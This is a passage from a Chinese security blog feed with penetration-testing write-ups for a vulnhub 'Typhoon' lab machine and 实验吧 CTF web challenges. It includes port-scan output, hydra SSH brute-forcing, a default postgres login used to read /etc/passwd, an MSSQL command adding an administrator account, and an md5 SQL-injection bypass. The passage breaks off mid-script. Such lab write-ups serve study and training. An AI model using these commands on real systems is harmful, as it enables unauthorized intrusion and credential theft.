responded</span><br></pre></td></tr></table></figure></p><p>前两个是类似网关的，第四个是kali的ip，中间第三个就是靶机的ip地址</p><p>用<code>masscan</code>也可以发现,同时端口也可以扫出来</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [3:04:28] C:1</span><br><span class="line">$ masscan -p0-65535 192.168.41.0/24 --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 07:05:04 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 256 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 631/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 139/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 80/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 22/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 5432/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 995/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 110/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 445/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 3306/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 27017/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 44337/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 6379/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 53/tcp on 192.168.41.2                                    </span><br><span class="line">Discovered open port 25/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 40811/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 33070/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 993/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 43074/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 21/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 53/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 2049/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 37535/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 8080/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 143/tcp on 192.168.41.166</span><br></pre></td></tr></table></figure></p><p>nmap扫描最常用命令<code>nmap -sV -A -p- ip</code>可以扫描到靶机开放的端口和服务，当然那台靶机开放了好多好多个端口，需要记住一些常用的端口和它们对应的服务</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.110.164</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 985 filtered ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 3.0.2</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_ftp-bounce: bounce working!</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.110.72</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)</span><br><span class="line">|   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)</span><br><span class="line">|   256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)</span><br><span class="line">|_  256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)</span><br><span class="line">25/tcp   open  smtp?</span><br><span class="line">|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.9.5-3-Ubuntu</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/mongoadmin/</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Typhoon Vulnerable VM by PRISMA CSI</span><br><span class="line">110/tcp  open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE STLS SASL CAPA UIDL RESP-CODES</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100003  2,3,4       2049/tcp  nfs</span><br><span class="line">|   100003  2,3,4       2049/udp  nfs</span><br><span class="line">|   100005  1,2,3      43523/tcp  mountd</span><br><span class="line">|   100005  1,2,3      58512/udp  mountd</span><br><span class="line">|   100021  1,3,4      39728/udp  nlockmgr</span><br><span class="line">|   100021  1,3,4      59010/tcp  nlockmgr</span><br><span class="line">|   100024  1          39860/udp  status</span><br><span class="line">|   100024  1          57414/tcp  status</span><br><span class="line">|   100227  2,3         2049/tcp  nfs_acl</span><br><span class="line">|_  100227  2,3         2049/udp  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp  open  imap        Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: OK more Pre-login have post-login listed capabilities IMAP4rev1 LOGINDISABLEDA0001 ID IDLE STARTTLS ENABLE LITERAL+ SASL-IR LOGIN-REFERRALS</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">993/tcp  open  ssl/imaps?</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">995/tcp  open  ssl/pop3s?</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">2049/tcp open  nfs_acl     2-3 (RPC #100227)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">|_mysql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS</span><br><span class="line">|_  Potentially risky methods: PUT DELETE</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: Apache-Coyote/1.1</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: WAP</span><br><span class="line">Running: Actiontec embedded, Linux</span><br><span class="line">OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel</span><br><span class="line">OS details: Actiontec MI424WR-GEN3I WAP</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Incremental</span><br><span class="line">Service Info: Host: TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></p><p>同时还有一个扫描结果：以前似乎没有看到过</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 1h43m54s, median: 7h59m58s</span><br><span class="line">| nbstat: NetBIOS name: TYPHOON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   TYPHOON&lt;00&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   TYPHOON&lt;03&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   TYPHOON&lt;20&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 4.1.6-Ubuntu)</span><br><span class="line">|   Computer name: typhoon</span><br><span class="line">|   NetBIOS computer name: TYPHOON\x00</span><br><span class="line">|   Domain name: local</span><br><span class="line">|   FQDN: typhoon.local</span><br><span class="line">|_  System time: 2019-08-09T11:30:49+03:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2019-08-09 04:30:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.04 ms 192.168.41.2</span><br><span class="line">2   0.17 ms 192.168.110.164</span><br></pre></td></tr></table></figure></p><p>我最先打的是2049端口，因为这个端口对应的是nfs服务，用这条命令：<code>nmap -sV --script=nfs-showmount ip</code>扫出可以远程挂载的目录</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/aaaaaaa.png" alt=""></p><p>之后尝试挂载，但是我无法用get命令将文件拷贝下来emmmm，主机也没有对应的挂载目录。</p><p>队友打了21号端口，但是信息也不是很多</p><p>22号端口是ssh服务，A组的师傅爆出了密码，参考安全客上的方法，可以先枚举用户名，</p><blockquote><p>发现靶机名字为typhoon就想着去测试一下看看账号存不存在,利用ssh用户枚举漏洞进行测试</p></blockquote><p>在GitHub上找了一个ssh_enum的脚本，尝试一下还行但是没有好字典</p><p>hydra可以爆破弱口令： <code>hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.56.150</code></p><p>第一次渗透感觉还不是很熟练，能够做到的就是这些😢</p><h3>21号端口</h3><p><code>search ftp_version</code>收集ftp服务器的信息</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/ftp/ftp_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.41.166:21     - FTP Banner: &apos;220 (vsFTPd 3.0.2)\x0d\x0a&apos;</span><br><span class="line">[*] 192.168.41.166:21     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p><p>如果这个版本的ftp有漏洞的话是不是可以getshell？</p><p>浏览器直接访问并没有什么东西<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon.png" alt=""></p><p>尝试使用<code>exploit/unix/ftp/vsftpd_234_backdoor</code>进行渗透但是没成功</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ftp0.png" alt=""></p><h3>22端口</h3><p>尝试枚举用户名为<code>typhoon</code></p><p>成功枚举<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon0.png" alt=""></p><p>使用hydra去爆破密码<code>hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.41.166</code></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typhoon1.png" alt=""></p><h3>25端口smtp服务</h3><p>获取到服务器的信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smtp/smtp_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.41.166:25     - 192.168.41.166:25 SMTP 220 typhoon ESMTP Postfix (Ubuntu)\x0d\x0a</span><br><span class="line">[*] 192.168.41.166:25     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p><h3>5432端口postgresql服务</h3><p>补充一点postgresql操作：</p><p>列出数据库<code>\l</code>：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">postgres=# \l</span><br><span class="line">                                  List of databases</span><br><span class="line">   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   </span><br><span class="line">-----------+----------+----------+-------------+-------------+-----------------------</span><br><span class="line"> postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | </span><br><span class="line"> template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +</span><br><span class="line">           |          |          |             |             | postgres=CTc/postgres</span><br><span class="line"> template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +</span><br><span class="line">           |          |          |             |             | postgres=CTc/postgres</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure></p><p>列出table'\d':</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ostgres=# \d</span><br><span class="line">         List of relations</span><br><span class="line"> Schema | Name  | Type  |  Owner   </span><br><span class="line">--------+-------+-------+----------</span><br><span class="line"> public | mrlee | table | postgres</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></p><p>之后使用metasploit的模块去收集信息</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/postgres/postgres_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 192.168.41.166:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p><p>直接发现弱口令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)</span><br><span class="line">[+] 192.168.41.166:5432 - Login Successful: postgres:postgres@template1</span><br><span class="line">[-] 192.168.41.166:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)</span><br></pre></td></tr></table></figure></p><p>然后登陆<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [3:34:50] C:127</span><br><span class="line">$ psql -h 192.168.41.166 -U postgres</span><br><span class="line">Password for user postgres: </span><br><span class="line">psql (11.2 (Debian 11.2-2), server 9.3.4)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# help</span><br></pre></td></tr></table></figure></p><p><code>select pg_ls_dir('./');</code>列出目录</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">postgres=# select pg_ls_dir(&apos;./&apos;);</span><br><span class="line">    pg_ls_dir    </span><br><span class="line">-----------------</span><br><span class="line"> PG_VERSION</span><br><span class="line"> pg_notify</span><br><span class="line"> pg_multixact</span><br><span class="line"> pg_subtrans</span><br><span class="line"> pg_serial</span><br><span class="line"> pg_snapshots</span><br><span class="line"> pg_stat</span><br><span class="line"> pg_clog</span><br><span class="line"> pg_xlog</span><br><span class="line"> base</span><br><span class="line"> pg_twophase</span><br><span class="line"> pg_tblspc</span><br><span class="line"> global</span><br><span class="line"> pg_stat_tmp</span><br><span class="line"> postmaster.opts</span><br><span class="line"> postmaster.pid</span><br><span class="line">(16 rows)</span><br></pre></td></tr></table></figure></p><p>建表并且从<code>/etc/passwd</code>中拷贝数据过来再读取,（这个姿势第一次见）</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">postgres=# DROP TABLE if EXISTS MrLee;</span><br><span class="line">NOTICE:  table &quot;mrlee&quot; does not exist, skipping</span><br><span class="line">DROP TABLE</span><br><span class="line">postgres=# CREATE TABLE MrLee(t TEXT);</span><br><span class="line">CREATE TABLE</span><br><span class="line">postgres=# COPY MrLee FROM &apos;/etc/passwd&apos;;</span><br><span class="line">COPY 44</span><br><span class="line">postgres=# SELECT * FROM MrLee limit 1 offset 0;</span><br><span class="line">                t                </span><br><span class="line">---------------------------------</span><br><span class="line"> root:x:0:0:root:/root:/bin/bash</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=# SELECT * FROM MrLee;</span><br><span class="line">                                         t                                         </span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line"> root:x:0:0:root:/root:/bin/bash</span><br><span class="line"> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line"> bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line"> sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure></p><h2>DC1靶机</h2><blockquote><p>姿势： find命令提权，hydra爆破，<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">Drupal重置管理员密码</a></p></blockquote><h2>需要积累一些靶机渗透的经验</h2><h3>msf有好多的扫描工具在auxiliary模块里面，常用的ftp，ssh，smb，https</h3><p><a href="https://www.cnblogs.com/-qing-/p/10128915.html" target="_blank" rel="noopener">msf各种弱口令爆破</a></p><h3>同时需要熟悉find和grep命令</h3><p><a href="https://www.cnblogs.com/-qing-/p/10867549.html" target="_blank" rel="noopener">Linux find和grep命令</a></p><h3>熟悉一下各种cms的常见姿势</h3><p><a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">忘记Drupal的管理员密码的解决办法</a></p><h3>metasploit渗透mssql服务</h3><p>1433端口对应于mssql服务，第一步一般是弱口令：<code>use auxiliary/scanner/mssql/mssql_login</code> 然后设置字典路径和远程主机即可</p><p>还可以使用<code>auxiliary/scanner/mssql/mssql_ping</code>进一步收集信息</p><p>之后尝试登陆mssql服务<code>use auxiliary/admin/mssql/mssql_exec</code> 可以设置cmd<code>set CMD cmd.exe /c net user</code></p><p>添加管理员用户，远程登陆：<code>cmd.exe /c net user shenlan test /add&amp;net localgroup administrator shenlan /add</code></p><p>开启3389端口一般是提供远程桌面服务，</p><p><a href="%E6%B8%97%E9%80%8F%E4%B9%8B%E2%80%94%E2%80%94Metasploit%E6%B8%97%E9%80%8FMSSQL">渗透之——Metasploit渗透MSSQL</a></p><h3>masscan扫描工具</h3><p>扫描指定网络和端口：<code>masscan.exe -p80 192.168.81.1/24</code></p><p>扫描指定主机所有开放的端口：</p><blockquote><p>masscan.exe -p0-65535 192.168.81.143</p></blockquote><p><code>--banners</code>可以获取服务器的banner信息 <code>--echo</code>选项将配置信息保存下来，这样可以下一次快速扫描</p><blockquote><p>masscan.exe -p80,443,3306 192.168.81.143 --banners --echo&gt;1.conf 保存配置信息masscan.exe -c 1.conf  读取配置信息</p></blockquote><p><code>--rate</code>提高扫描速度<a href="%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%EF%BC%9AWindows%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8CMasscan%E5%92%8CNmap">渗透技巧：Windows平台运行Masscan和Nmap</a></p><h3>nmap高级使用技巧</h3><p>nmap常见的扫描方式：</p><p>半开放扫描: -sS 没有建立三次握手连接，速度很快全连接扫描：-sT  三次握手过程，速度较慢扫描UDP端口： -sU</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。&lt;/p&gt;
&lt;p&gt;今天又重新从 https://vulnhub.com 上把靶机搞下来装到Vmware上自己实验&lt;/p&gt;
&lt;p&gt;靶机渗
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
      <category term="靶机" scheme="https://prontosil.club/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="nfs" scheme="https://prontosil.club/tags/nfs/"/>
    
      <category term="nmap" scheme="https://prontosil.club/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web</title>
    <link href="https://prontosil.club/2019/08/06/%E5%AE%9E%E9%AA%8C%E5%90%A7web/"/>
    <id>https://prontosil.club/2019/08/06/实验吧web/</id>
    <published>2019-08-06T13:21:26.000Z</published>
    <updated>2019-08-08T10:41:36.606Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下实验吧的wp</p><h2>后台登陆</h2><p>ctrl+u查看源码</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">&#125; --&gt;</span><br></pre></td></tr></table></figure></p><p>一上来就问管理员密码，并且要求登陆，那么是爆破呢，还是爆破呢？</p><p>emmmmm其实这题的考点是md5的</p><p>查了一下官方文档，md5函数的第二个参数如果为true,那么就会返回原始16字符二进制格式</p><p>而且sql语句显然是可以拼接注入的，关键在于如何注入了</p><p>提供一个字符串： ffifdyopmd5后，276f722736c95d99e921722cf9ed621c再转成字符串:' ' 'or' 6&lt;trach&gt;解析:存在  or  即代码的两边有一边为真既可以绕过，&lt;trach&gt;其实为垃圾代码没有任何用的。or 后面有6，非零值即为真。既可以成功绕过。</p><blockquote><p>http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</p></blockquote><p>当然看评论也有说密码就是e58的<a href="https://www.jianshu.com/p/" target="_blank" rel="noopener">参考</a></p><h2>认真一点</h2><p>这道题是盲注的题目，不太好搞</p><h2>天下武功唯快不破</h2><p>这个可以通过浏览器抓包，然后发现响应头中有一个FLAG字段显然是base64加密过的，解密之后就会得到提示，让你写脚本post提交</p><p>我写的垃圾代码如下：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res = urllib.urlopen(<span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span>)</span><br><span class="line"></span><br><span class="line">head = 